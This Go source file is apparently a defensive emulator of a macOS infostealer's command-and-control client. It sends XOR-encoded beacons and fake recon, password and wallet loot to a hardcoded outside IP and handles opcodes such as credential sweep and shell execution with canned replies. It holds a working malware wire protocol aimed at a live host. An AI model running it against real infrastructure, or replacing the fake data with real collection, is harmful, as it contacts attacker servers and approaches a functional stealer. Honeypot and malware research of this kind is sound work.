// Package main implements a C2 emulator for security research and honeypot analysis.
package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"math/rand/v2"
	"net/http"
	"os"
	"strings"
	"time"
)

const (
	C2URL     = "http://46.30.191.141/index.php" //nolint:revive // HTTP intentional for C2 emulation
	UserAgent = "curl/8.4.0"
	IDFile    = ".victim_id"
	Marker    = 'K'
)

var OpcodeMap = map[string]string{
	"1": "FULL_RECON",
	"2": "SCREENSHOT",
	"3": "CREDENTIAL_SWEEP",
	"4": "FILE_SEARCH",
	"5": "EXEC_SHELL",
	"6": "TERMINATE",
}

type Emulator struct {
	Log      *slog.Logger
	Client   *http.Client
	UUID     string
	RawID    string
	Hostname string
	User     string
}

func NewEmulator() *Emulator {
	logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	id := loadUUID()
	return &Emulator{
		UUID:     id,
		RawID:    strings.ToUpper(strings.ReplaceAll(id, "-", "")),
		Hostname: "MacBook-Pro-M1",
		User:     "alex",
		Log:      logger,
		Client:   &http.Client{Timeout: 30 * time.Second},
	}
}

func loadUUID() string {
	if data, err := os.ReadFile(IDFile); err == nil {
		return strings.TrimSpace(string(data))
	}
	//nolint:gosec // Weak random intentional for realistic emulation
	id := fmt.Sprintf("%08X-%04X-4%03X-8%03X-%012X",
		rand.Uint32(), rand.Uint32()>>16, rand.Uint32()>>20, rand.Uint32()>>20, rand.Uint64()>>16)
	//nolint:gosec // File permissions match typical malware behavior
	if err := os.WriteFile(IDFile, []byte(id), 0o644); err != nil {
		// Continue without persisting ID
		return id
	}
	return id
}

func (e *Emulator) xor(data []byte) []byte {
	key := []byte(e.RawID)
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

func (e *Emulator) post(payload string, label string) ([]byte, error) {
	encrypted := e.xor([]byte(payload))
	packet := make([]byte, 33+len(encrypted))
	copy(packet[0:32], e.RawID)
	packet[32] = Marker
	copy(packet[33:], encrypted)

	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, C2URL, bytes.NewBuffer(packet))
	if err != nil {
		return nil, err
	}
	req.Header = make(http.Header)
	req.Header["Host"] = []string{"46.30.191.141"}
	req.Header["User-Agent"] = []string{UserAgent}
	req.Header["Accept"] = []string{"*/*"}
	req.Header["Content-Type"] = []string{"application/octet-stream"}
	req.Header["Connection"] = []string{"Keep-Alive"}

	e.Log.Debug("wire_out", "stage", label, "bytes", len(packet))

	resp, err := e.Client.Do(req)
	if err != nil {
		return nil, err
	}
	defer func() {
		if closeErr := resp.Body.Close(); closeErr != nil {
			e.Log.Debug("close_error", "error", closeErr)
		}
	}()
	return io.ReadAll(resp.Body)
}

func (e *Emulator) handleShell(command string) string {
	cmd := strings.TrimSpace(command)
	e.Log.Warn("COMMAND_INBOUND", "cmd", cmd)
	switch cmd {
	case "whoami":
		return e.User
	case "sw_vers":
		return "ProductName:\tmacOS\nProductVersion:\t14.2.1\nBuildVersion:\t23C71"
	case "id":
		return "uid=501(alex) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),80(admin)"
	default:
		return ".DS_Store\nDesktop\nDocuments\nDownloads\nLibrary"
	}
}

func (e *Emulator) poll() {
	heartbeat := fmt.Sprintf("ID: %s | STATUS: IDLE", e.RawID)
	resp, err := e.post(heartbeat, "heartbeat")
	if err != nil || len(resp) == 0 {
		return
	}

	decrypted := string(e.xor(resp))
	parts := strings.Split(decrypted, "|")
	opcode := parts[0]
	cmdName := OpcodeMap[opcode]

	if _, err := e.post(fmt.Sprintf("ACK: Starting %s", cmdName), "immediate_ack"); err != nil {
		e.Log.Debug("ack_failed", "error", err)
	}

	var result string
	switch cmdName {
	case "EXEC_SHELL":
		if len(parts) > 1 {
			result = e.handleShell(parts[1])
		}
	case "SCREENSHOT":
		result = string([]byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46}) + " [FAKE_JPG_DATA]"
	case "CREDENTIAL_SWEEP":
		result = "FOUND|/Users/alex/Library/Application Support/Exodus/seed.secl\nFOUND|/Users/alex/Library/Keychains/login.keychain-db"
	default:
		result = "DONE"
	}

	if result != "" {
		if _, err := e.post(result, "final_result"); err != nil {
			e.Log.Debug("result_post_failed", "error", err)
		}
	}
}

func main() {
	e := NewEmulator()
	e.Log.Info("emulation_online", "victim", e.RawID)

	// Stage 1: Recon & Password (Exact labels from __cstring)
	recon := fmt.Sprintf("UUID: %s\nmacOS Password: password123\nHostname: %s\nUsername: %s\nVersion: v1.0.4",
		e.UUID, e.Hostname, e.User)
	if _, err := e.post(recon, "registration_recon"); err != nil {
		e.Log.Debug("registration_recon_failed", "error", err)
	}

	time.Sleep(2 * time.Second)

	// Stage 2: Loot (Fake Wallet Data)
	loot := "FILE: exodus_seed.txt | DATA: [ENCRYPTED_BLOB]\nFILE: chrome_cookies.sqlite | DATA: [ENCRYPTED_BLOB]"
	if _, err := e.post(loot, "registration_loot"); err != nil {
		e.Log.Debug("registration_loot_failed", "error", err)
	}

	for {
		e.poll()
		//nolint:gosec // Weak random intentional for realistic jitter
		time.Sleep(60*time.Second + time.Duration(rand.IntN(10))*time.Second)
	}
}
